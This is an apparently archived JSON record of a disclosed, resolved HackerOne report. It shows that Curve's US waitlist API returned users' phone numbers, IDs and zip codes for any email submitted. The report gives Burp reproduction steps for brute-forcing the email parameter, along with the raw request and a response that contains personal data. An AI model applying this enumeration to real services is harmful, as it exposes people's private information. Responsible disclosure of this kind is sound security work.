@@ -1,0 +1,231 @@
+{
+  "id": 902733,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDI3MzM=",
+  "url": "https://hackerone.com/reports/902733",
+  "title": "Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-19T10:20:26.553Z",
+  "submitted_at": "2020-06-19T10:20:26.553Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "praseudo7",
+    "url": "/praseudo7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/UumeeqKTPz2Bksm4LkvJydZH/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39838,
+    "url": "https://hackerone.com/curve",
+    "handle": "curve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8AA4ZoJhh8Ac3BjKh7Ee7nK5/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/8AA4ZoJhh8Ac3BjKh7Ee7nK5/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Curve",
+      "twitter_handle": "imaginecurve",
+      "website": "https://curve.com",
+      "about": "Simplify your finances with all your cards in one. Carry less. See more. Spend smart. Save more."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-10-23T15:38:56.276Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-23T15:38:48.059Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nWhen am going through all the JS files in curve.com I found a link called \"/usa\" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details. \n\n{F874173}\n\nThen there is a functionality called \"Track my Position\" by using which joined users can view their position in the waiting lists. \n\n{F874174}\n\nWell, in UI the application only shows the position number but not any other sensitive details. \n\n{F874175}\n\nBut by using the below reported endpoint an attacker can retrieve all the joined users mobile numbers and the other details by just entering the victims email address.\n\nSteps to Reproduce:\n=================\n1] Navigate to https://curve.com/usa and click on \"Track my position\"\n2] Enter any email address and click on \"Submit\"\n3] Make sure to intercept the request using Burp intercept\n4] You'll be presented with the below vulnerable request\n\nVulnerable Request:\n=================\n```\nPOST /api/waitlist/us HTTP/1.1\nHost: website-api.production.curve.app\nConnection: close\nContent-Length: 30\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\nContent-Type: application/json;charset=UTF-8\nOrigin: https://www.curve.com\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://www.curve.com/credit?rc=\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\n\n{\"email\":\"praseudo@gmail.com\"}\n```\n\n5] Now send the above vulnerable request to Burp intruder and brute force the email parameter\n6] You'll now be able to retrieve all the waitlisted users mobile numbers, ID's, address and other sensitive information in the response.\n\nResponse:\n=========\n```\nHTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nContent-Length: 268\nConnection: close\naccess-control-allow-origin: *\nx-dns-prefetch-control: off\nx-frame-options: SAMEORIGIN\nstrict-transport-security: max-age=15552000; includeSubDomains\nx-download-options: noopen\nx-content-type-options: nosniff\nx-xss-protection: 1; mode=block\netag: W/\"10c-Qj52/PIteKYG+1CbKaOCNpKyiDo\"\ndate: Fri, 19 Jun 2020 09:41:26 GMT\nx-envoy-upstream-service-time: 3\nx-envoy-peer-metadata: Ch4KDElOU1RBTkNFX0lQUxIOGgwxMC4wLjE1Mi4yMDEK0AEKBkxBQkVMUxLFASrCAQoUCgNhcHASDRoLd2Vic2l0ZS1hcGkKIQoRcG9kLXRlbXBsYXRlLWhhc2gSDBoKN2Q5NzRmNTQ3NQokChlzZWN1cml0eS5pc3Rpby5pby90bHNNb2RlEgcaBWlzdGlvCjAKH3NlcnZpY2UuaXN0aW8uaW8vY2Fub25pY2FsLW5hbWUSDRoLd2Vic2l0ZS1hcGkKLwojc2VydmljZS5pc3Rpby5pby9jYW5vbmljYWwtcmV2aXNpb24SCBoGbGF0ZXN0ChoKB01FU0hfSUQSDxoNY2x1c3Rlci5sb2NhbAomCgROQU1FEh4aHHdlYnNpdGUtYXBpLTdkOTc0ZjU0NzUtZHRuZzgKGQoJTkFNRVNQQUNFEgwaCnByb2R1Y3Rpb24KUgoFT1dORVISSRpHa3ViZXJuZXRlczovL2FwaXMvYXBwcy92MS9uYW1lc3BhY2VzL3Byb2R1Y3Rpb24vZGVwbG95bWVudHMvd2Vic2l0ZS1hcGkKHwoPU0VSVklDRV9BQ0NPVU5UEgwaCnZhdWx0LWF1dGgKHgoNV09SS0xPQURfTkFNRRINGgt3ZWJzaXRlLWFwaQ==\nx-envoy-peer-metadata-id: sidecar~10.0.152.201~website-api-7d974f5475-dtng8.production~production.svc.cluster.local\nserver: envoy\nX-Cache: Miss from cloudfront\nVia: 1.1 1671dd64160321b1f8979341944a5b14.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: MAA50-C2\nX-Amz-Cf-Id: kUgxzRYYQ9rJw0zP7oR4PnDz6Rz4bCc6r30M25JrfmOyzp_xuMEHyA==\n\n{\"_id\":\"5eec6b1a958666b5141063e3\",\"name\":\"Cxvvc\",\"email\":\"praseudo@gmail.com\",\"phoneNumber\":\"7013899887\",\"zipcode\":\"10001\",\"position\":4379,\"referralCode\":\"BCeE8mzI\",\"createdAt\":\"2020-06-19T07:36:58.460Z\",\"updatedAt\":\"2020-06-19T07:36:58.460Z\",\"__v\":0,\"status\":\"EXIST\"}\n```\n\nBelow is the video POC for better understanding:\n\n{F874205}\n\n## Impact\n\nAn attacker can retrieve all the joined users PII data (like mobile numbers, address, ID's, etc) by just entering the mail address at \"Track my position\" at https://curve.com/usa.\n\nMitigation:\n=========\nMake sure to remove sensitive response parameters which discloses users PII data.\n\n\nRegards,\nPraseudo",
+  "weakness": {
+    "id": 34,
+    "name": "Cleartext Transmission of Sensitive Information"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 874173,
+      "file_name": "Image_2020-06-19_at_2.57.13_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nX8NeRLfEWUBuG6vEE2kpnmq?response-content-disposition=attachment%3B%20filename%3D%22Image_2020-06-19_at_2.57.13_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Image_2020-06-19_at_2.57.13_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYXPNCXB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045608Z&X-Amz-Expires=2600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDR8q8jryTpRg8zZhk6pPtNWsqkS%2FuLpF7EMRcZCznbXQIgALnQh4HH%2FapujicwyqO4dRXg0TAsMjkA4ycnGibI9NsqsgUIeRADGgwwMTM2MTkyNzQ4NDkiDBVBriEpPmOSSK9NiyqPBRBS6yR0gSAhnqaeoCBO3TOdR96%2FALpMjo1zthGA7x1H8%2BUgokoRv2aTnvPyNjam2PlV981ee%2Fr5968xn%2FiEGV9WyrjexjR8Us19VYZu95%2BvsAqcDv3iI7AYH5NItXy1Ia5t%2Fmi1FyL%2Fi26FrGRrvpk23exaTI%2FSbQ0pv62wHZsz2jnADpA2d83ZSe1Y4cGM5afSBya08yl%2BQqTnDJBX%2BXz32ynZ4i0GqoUpl7jp8%2BrX8ZWK5mhReE1OxEVGoQ6cHG5S47KEy5SigedXqG6VtzczqPPT9rIqRGJE%2BOu8hwUBMx6DnrKJWCybD7JQdNqJsWP4FlNBAkcW82F8dATSXs1CHPaFeRvazDPBtvI0MbYjVe7oQaKbOUVr%2FD3LTdqWTSgLyBPrXukeP7mHfheFzNRqpb21NDYPaiOI8qW%2Bbi2L%2B%2FJtioYj814iw3%2FICwub1rUtqNkNEYXrQbw6Xj4nmx6eY%2FUFIZQLhKa2HSuCyw37cnuiXvZDvwCXF0JnKc34txppSp7YT7wTXPN8re46Spg2zic8jYH0rBfjJZxk9umvpUNwVHz6GLfQEANPPMbcFHvT2U4iHAsKDXe0C61k4fvwFUXbedGHtriYhv9QSyhCAsVp5tui1lciYH%2B2DabbtPJMZZmqRQ0oNfNZff%2FsNTavtOM3Xvz5n%2F1elAivwvbmf1cSFTZqufwHhWgb5rXcgCtpYjUlJAaHZGAqWwqvm5%2BrIsc159519ONjVygD%2FriJh%2Fas9ktJkG2iI%2F%2BdSOS1TYIGdf2DqQ86EVQoP4m%2F33XPuamB%2Feo6taix0gNZvygnKsAamAWFbrqjRDWi8xkBC45mDZERPma5BMpgAwUMtcv%2F4DhNz1Zjty073y3LVRowtJS20gY6sQE0wfb1SQdwlUNR0GXBi1Zm%2FSiV9FgElXFWi3tqzp%2B6iEWyRGUaA2lqTiZJ6%2BRHLczfn5vnlbtoYrj4zSGjROPp9yCxoPxVX9Z1F2jlsy5LkHFE9UNMFcOjyECxGQQthVhHBoYNKYyxVUNfdOjjJtzWhWA5ufpkrt3l7Gzq%2FkRyoD5fWz0WX5YUAffnm5%2BeAkFa%2FtuP5bt%2BaEoYZOrFppuTm%2FKhLKMhlDlhMYHsJaQoQBA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=645f61968cf2335d643dee0da17f140bb7b9496812568dd85bb111db33998004",
+      "file_size": 389492,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 874174,
+      "file_name": "Image_2020-06-19_at_2.59.13_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9W5G5QXU85mpfy1Shy4AyqSz?response-content-disposition=attachment%3B%20filename%3D%22Image_2020-06-19_at_2.59.13_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Image_2020-06-19_at_2.59.13_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYXPNCXB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045608Z&X-Amz-Expires=2600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDR8q8jryTpRg8zZhk6pPtNWsqkS%2FuLpF7EMRcZCznbXQIgALnQh4HH%2FapujicwyqO4dRXg0TAsMjkA4ycnGibI9NsqsgUIeRADGgwwMTM2MTkyNzQ4NDkiDBVBriEpPmOSSK9NiyqPBRBS6yR0gSAhnqaeoCBO3TOdR96%2FALpMjo1zthGA7x1H8%2BUgokoRv2aTnvPyNjam2PlV981ee%2Fr5968xn%2FiEGV9WyrjexjR8Us19VYZu95%2BvsAqcDv3iI7AYH5NItXy1Ia5t%2Fmi1FyL%2Fi26FrGRrvpk23exaTI%2FSbQ0pv62wHZsz2jnADpA2d83ZSe1Y4cGM5afSBya08yl%2BQqTnDJBX%2BXz32ynZ4i0GqoUpl7jp8%2BrX8ZWK5mhReE1OxEVGoQ6cHG5S47KEy5SigedXqG6VtzczqPPT9rIqRGJE%2BOu8hwUBMx6DnrKJWCybD7JQdNqJsWP4FlNBAkcW82F8dATSXs1CHPaFeRvazDPBtvI0MbYjVe7oQaKbOUVr%2FD3LTdqWTSgLyBPrXukeP7mHfheFzNRqpb21NDYPaiOI8qW%2Bbi2L%2B%2FJtioYj814iw3%2FICwub1rUtqNkNEYXrQbw6Xj4nmx6eY%2FUFIZQLhKa2HSuCyw37cnuiXvZDvwCXF0JnKc34txppSp7YT7wTXPN8re46Spg2zic8jYH0rBfjJZxk9umvpUNwVHz6GLfQEANPPMbcFHvT2U4iHAsKDXe0C61k4fvwFUXbedGHtriYhv9QSyhCAsVp5tui1lciYH%2B2DabbtPJMZZmqRQ0oNfNZff%2FsNTavtOM3Xvz5n%2F1elAivwvbmf1cSFTZqufwHhWgb5rXcgCtpYjUlJAaHZGAqWwqvm5%2BrIsc159519ONjVygD%2FriJh%2Fas9ktJkG2iI%2F%2BdSOS1TYIGdf2DqQ86EVQoP4m%2F33XPuamB%2Feo6taix0gNZvygnKsAamAWFbrqjRDWi8xkBC45mDZERPma5BMpgAwUMtcv%2F4DhNz1Zjty073y3LVRowtJS20gY6sQE0wfb1SQdwlUNR0GXBi1Zm%2FSiV9FgElXFWi3tqzp%2B6iEWyRGUaA2lqTiZJ6%2BRHLczfn5vnlbtoYrj4zSGjROPp9yCxoPxVX9Z1F2jlsy5LkHFE9UNMFcOjyECxGQQthVhHBoYNKYyxVUNfdOjjJtzWhWA5ufpkrt3l7Gzq%2FkRyoD5fWz0WX5YUAffnm5%2BeAkFa%2FtuP5bt%2BaEoYZOrFppuTm%2FKhLKMhlDlhMYHsJaQoQBA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=27bb0344facbdc5f270e9d376fc1717a1c3574e93d1d5a12bf96a166da82da85",
+      "file_size": 1330954,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 874175,
+      "file_name": "Image_2020-06-19_at_3.23.36_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FVcP3JS9NWz9cKPfxhWWgtvi?response-content-disposition=attachment%3B%20filename%3D%22Image_2020-06-19_at_3.23.36_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Image_2020-06-19_at_3.23.36_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYXPNCXB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045608Z&X-Amz-Expires=2600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDR8q8jryTpRg8zZhk6pPtNWsqkS%2FuLpF7EMRcZCznbXQIgALnQh4HH%2FapujicwyqO4dRXg0TAsMjkA4ycnGibI9NsqsgUIeRADGgwwMTM2MTkyNzQ4NDkiDBVBriEpPmOSSK9NiyqPBRBS6yR0gSAhnqaeoCBO3TOdR96%2FALpMjo1zthGA7x1H8%2BUgokoRv2aTnvPyNjam2PlV981ee%2Fr5968xn%2FiEGV9WyrjexjR8Us19VYZu95%2BvsAqcDv3iI7AYH5NItXy1Ia5t%2Fmi1FyL%2Fi26FrGRrvpk23exaTI%2FSbQ0pv62wHZsz2jnADpA2d83ZSe1Y4cGM5afSBya08yl%2BQqTnDJBX%2BXz32ynZ4i0GqoUpl7jp8%2BrX8ZWK5mhReE1OxEVGoQ6cHG5S47KEy5SigedXqG6VtzczqPPT9rIqRGJE%2BOu8hwUBMx6DnrKJWCybD7JQdNqJsWP4FlNBAkcW82F8dATSXs1CHPaFeRvazDPBtvI0MbYjVe7oQaKbOUVr%2FD3LTdqWTSgLyBPrXukeP7mHfheFzNRqpb21NDYPaiOI8qW%2Bbi2L%2B%2FJtioYj814iw3%2FICwub1rUtqNkNEYXrQbw6Xj4nmx6eY%2FUFIZQLhKa2HSuCyw37cnuiXvZDvwCXF0JnKc34txppSp7YT7wTXPN8re46Spg2zic8jYH0rBfjJZxk9umvpUNwVHz6GLfQEANPPMbcFHvT2U4iHAsKDXe0C61k4fvwFUXbedGHtriYhv9QSyhCAsVp5tui1lciYH%2B2DabbtPJMZZmqRQ0oNfNZff%2FsNTavtOM3Xvz5n%2F1elAivwvbmf1cSFTZqufwHhWgb5rXcgCtpYjUlJAaHZGAqWwqvm5%2BrIsc159519ONjVygD%2FriJh%2Fas9ktJkG2iI%2F%2BdSOS1TYIGdf2DqQ86EVQoP4m%2F33XPuamB%2Feo6taix0gNZvygnKsAamAWFbrqjRDWi8xkBC45mDZERPma5BMpgAwUMtcv%2F4DhNz1Zjty073y3LVRowtJS20gY6sQE0wfb1SQdwlUNR0GXBi1Zm%2FSiV9FgElXFWi3tqzp%2B6iEWyRGUaA2lqTiZJ6%2BRHLczfn5vnlbtoYrj4zSGjROPp9yCxoPxVX9Z1F2jlsy5LkHFE9UNMFcOjyECxGQQthVhHBoYNKYyxVUNfdOjjJtzWhWA5ufpkrt3l7Gzq%2FkRyoD5fWz0WX5YUAffnm5%2BeAkFa%2FtuP5bt%2BaEoYZOrFppuTm%2FKhLKMhlDlhMYHsJaQoQBA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10d1aa128961f0b05e20666504b9af0e6a52e353bf62c6fbaf4758682496432f",
+      "file_size": 816920,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 874205,
+      "file_name": "Curve_Sens_Info.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bpnavKD6snJQ9HmXvMq7EPpk?response-content-disposition=attachment%3B%20filename%3D%22Curve_Sens_Info.mov%22%3B%20filename%2A%3DUTF-8%27%27Curve_Sens_Info.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYXPNCXB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045608Z&X-Amz-Expires=2600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDR8q8jryTpRg8zZhk6pPtNWsqkS%2FuLpF7EMRcZCznbXQIgALnQh4HH%2FapujicwyqO4dRXg0TAsMjkA4ycnGibI9NsqsgUIeRADGgwwMTM2MTkyNzQ4NDkiDBVBriEpPmOSSK9NiyqPBRBS6yR0gSAhnqaeoCBO3TOdR96%2FALpMjo1zthGA7x1H8%2BUgokoRv2aTnvPyNjam2PlV981ee%2Fr5968xn%2FiEGV9WyrjexjR8Us19VYZu95%2BvsAqcDv3iI7AYH5NItXy1Ia5t%2Fmi1FyL%2Fi26FrGRrvpk23exaTI%2FSbQ0pv62wHZsz2jnADpA2d83ZSe1Y4cGM5afSBya08yl%2BQqTnDJBX%2BXz32ynZ4i0GqoUpl7jp8%2BrX8ZWK5mhReE1OxEVGoQ6cHG5S47KEy5SigedXqG6VtzczqPPT9rIqRGJE%2BOu8hwUBMx6DnrKJWCybD7JQdNqJsWP4FlNBAkcW82F8dATSXs1CHPaFeRvazDPBtvI0MbYjVe7oQaKbOUVr%2FD3LTdqWTSgLyBPrXukeP7mHfheFzNRqpb21NDYPaiOI8qW%2Bbi2L%2B%2FJtioYj814iw3%2FICwub1rUtqNkNEYXrQbw6Xj4nmx6eY%2FUFIZQLhKa2HSuCyw37cnuiXvZDvwCXF0JnKc34txppSp7YT7wTXPN8re46Spg2zic8jYH0rBfjJZxk9umvpUNwVHz6GLfQEANPPMbcFHvT2U4iHAsKDXe0C61k4fvwFUXbedGHtriYhv9QSyhCAsVp5tui1lciYH%2B2DabbtPJMZZmqRQ0oNfNZff%2FsNTavtOM3Xvz5n%2F1elAivwvbmf1cSFTZqufwHhWgb5rXcgCtpYjUlJAaHZGAqWwqvm5%2BrIsc159519ONjVygD%2FriJh%2Fas9ktJkG2iI%2F%2BdSOS1TYIGdf2DqQ86EVQoP4m%2F33XPuamB%2Feo6taix0gNZvygnKsAamAWFbrqjRDWi8xkBC45mDZERPma5BMpgAwUMtcv%2F4DhNz1Zjty073y3LVRowtJS20gY6sQE0wfb1SQdwlUNR0GXBi1Zm%2FSiV9FgElXFWi3tqzp%2B6iEWyRGUaA2lqTiZJ6%2BRHLczfn5vnlbtoYrj4zSGjROPp9yCxoPxVX9Z1F2jlsy5LkHFE9UNMFcOjyECxGQQthVhHBoYNKYyxVUNfdOjjJtzWhWA5ufpkrt3l7Gzq%2FkRyoD5fWz0WX5YUAffnm5%2BeAkFa%2FtuP5bt%2BaEoYZOrFppuTm%2FKhLKMhlDlhMYHsJaQoQBA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0a3d99e38d15e56e797689cb81564930a0d00a977b1f796763de9aea4e629d56",
+      "file_size": 32222990,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-10-23T15:38:48.129Z",
+  "allow_singular_disclosure_after": -180019039.9140706,
+  "singular_disclosure_allowed": true,
+  "vote_count": 79,
+  "voters": [
+    "newfolder",
+    "foobar7",
+    "nightm4re",
+    "leonishan",
+    "mik317",
+    "f_m",
+    "qtros",
+    "0nlymohammed",
+    "down_to_earth_23",
+    "hundredpercent",
+    "and 69 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 24989,
+    "asset_type": "URL",
+    "asset_identifier": "curve.app",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "902733",
+  "votes": 79,
+  "latest_disclosable_activity_at": "2020-10-23T15:38:56.346Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T12:56:08.166552",
+    "source": "https://hackerone.com/reports/902733.json",
+    "report_id": 902733
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDI3MzM=",
+    "databaseId": "902733",
+    "title": "Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us",
+    "url": "https://hackerone.com/reports/902733",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-10-23T15:38:56.276Z",
+    "created_at": "2020-06-19T10:20:26.553Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzM0",
+      "name": "Cleartext Transmission of Sensitive Information",
+      "external_id": "cwe-319"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "praseudo7"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM5ODM4",
+      "handle": "curve",
+      "name": "Curve",
+      "url": "https://hackerone.com/curve",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yMjgxMDE=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-07-09T15:39:02.017Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzkwMjczMw==",
+    "_id": "902733",
+    "disclosed": true,
+    "votes": 79,
+    "latest_disclosable_activity_at": "2020-10-23T15:38:56.346Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDI3MzM=",
+      "databaseId": "902733",
+      "title": "Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us",
+      "url": "https://hackerone.com/reports/902733",
+      "disclosed_at": "2020-10-23T15:38:56.276Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM5ODM4",
+      "handle": "curve",
+      "name": "Curve",
+      "url": "https://hackerone.com/curve",
+      "currency": "usd"
+    }
+  }
+}
